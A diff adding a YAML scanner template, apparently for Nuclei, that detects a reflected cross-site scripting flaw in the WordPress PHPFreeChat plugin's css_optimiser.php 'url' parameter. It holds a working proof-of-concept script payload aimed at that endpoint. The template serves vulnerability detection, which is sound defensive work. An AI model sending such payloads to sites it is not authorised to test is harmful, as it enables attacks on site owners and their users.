@@ -1,0 +1,25 @@
+id: wp-phpfreechat-xss
+info:
+  author: daffainfo
+  name: WordPress Plugin PHPFreeChat - 'url' Reflected Cross-Site Scripting (XSS)
+  reference:
+  - http://web.archive.org/web/20210120061848/https://www.securityfocus.com/bid/54332/info
+  severity: medium
+  tags: wordpress,xss,wp-plugin
+requests:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - </script><script>alert(document.domain)</script>
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
